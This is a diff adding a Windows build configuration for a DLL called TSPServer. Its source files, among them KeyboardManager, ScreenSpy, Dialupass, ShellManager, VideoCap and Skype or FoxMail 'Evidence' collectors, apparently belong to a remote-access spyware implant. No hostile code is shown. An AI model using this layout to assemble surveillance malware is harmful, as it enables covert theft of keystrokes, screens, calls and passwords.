@@ -1,0 +1,81 @@
+TARGETNAME=TSPServer
+TARGETTYPE=DYNLINK
+
+USE_MSVCRT=1
+USE_STL=1
+USE_NATIVE_EH=CTHROW
+NO_SAFESEH = 1
+
+MSC_WARNING_LEVEL=/W3
+
+#C_DEFINES=$(C_DEFINES) -DUNICODE -D_UNICODE
+C_DEFINES=$(C_DEFINES) -DMBCS -D_MBCS -D_DLL
+
+SOURCES=Audio.cpp     \
+	AudioManager.cpp	\
+	Buffer.cpp	\
+	ClientSocket.cpp	\
+	Dialupass.cpp	\
+	FileManager.cpp	\
+	install.cpp	\
+	KernelManager.cpp	\
+	KeyboardManager.cpp	\
+	Manager.cpp	\
+	RegEditEx.cpp	\
+	ScreenManager.cpp	\
+	ScreenSpy.cpp	\
+	ShellManager.cpp	\
+	TSPServer.cpp	\
+	SystemManager.cpp	\
+	until.cpp	\
+	VideoCap.cpp	\
+	VideoManager.cpp	\
+	Evidence.cpp	\
+	EvidenceManager.cpp	\
+	Skype.cpp	\
+	list.cpp	\
+	EvidenceScreen.cpp	\
+	EvidenceFoxMail.cpp	\
+	StdAfx.cpp	\
+	TSPServer.rc	\
+        MyCommon.cpp    \
+
+
+
+INCLUDES= $(SDK_INC_PATH);\
+	..\WdkPath;\
+
+TARGETLIBS=\
+        $(SDK_LIB_PATH)\advapi32.lib  \
+        $(SDK_LIB_PATH)\kernel32.lib  \
+        $(SDK_LIB_PATH)\ntdll.lib     \
+        $(SDK_LIB_PATH)\setupapi.lib  \
+        $(SDK_LIB_PATH)\shell32.lib   \
+        $(SDK_LIB_PATH)\user32.lib    \
+        $(SDK_LIB_PATH)\shlwapi.lib   \
+        $(SDK_LIB_PATH)\ws2_32.lib    \
+        $(SDK_LIB_PATH)\wininet.lib   \
+        $(SDK_LIB_PATH)\Iphlpapi.lib  \
+        $(SDK_LIB_PATH)\winmm.lib  \
+        $(SDK_LIB_PATH)\gdi32.lib  \
+        $(SDK_LIB_PATH)\WtsApi32.lib  \
+        $(SDK_LIB_PATH)\vfw32.lib  \
+        $(SDK_LIB_PATH)\imm32.lib  \
+        $(SDK_LIB_PATH)\psapi.lib  \
+	$(SDK_LIB_PATH)\ole32.lib  \
+	$(SDK_LIB_PATH)\Oleaut32.lib  \
+        ..\WdkPath\imagehlp.lib  \
+	zlib\zlib-1.2.5.lib	\
+        $(SDK_LIB_PATH)\Uuid.Lib\
+	
+
+
+UMTYPE=windows
+UMENTRY=dllmain
+
+DLLDEF=TSPServer.def
+
+MUI=0
+
+MUI_COMMENT=LGNEXCLUDE_MOVE, moved from exclusion txt, owners have to contact MUICore to resolve
+
